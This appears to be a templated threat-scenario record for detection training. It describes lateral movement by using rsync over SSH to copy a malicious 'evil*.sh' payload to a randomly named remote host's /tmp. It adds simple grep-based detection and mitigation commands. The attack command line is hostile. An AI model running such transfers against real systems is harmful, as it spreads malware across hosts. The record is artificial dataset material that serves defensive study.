---
type: campaign
scenario_id: 309
tactic: Lateral Movement
technique: "T1021.004: Remote Services: SSH"
technique_id: T1021.004
tags: [campaign, lotl, lateral_movement]
---

# Using rsync to transfer malicious payload to remote Linux host.

## Threat Description
Using rsync to transfer malicious payload to remote Linux host.

## Attack Command
```
rsync -e ssh $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp
```

## Detection Logic
Monitor rsync: `ps aux | grep rsync | grep sh`; Monitor SSH traffic: `netstat -anp | grep :22`.

## Mitigation
Restrict rsync: `chmod 700 /usr/bin/rsync`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.

## AI Training Prompt
Train AI to detect rsync payload transfer and suggest SSH restrictions.

## References
- MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
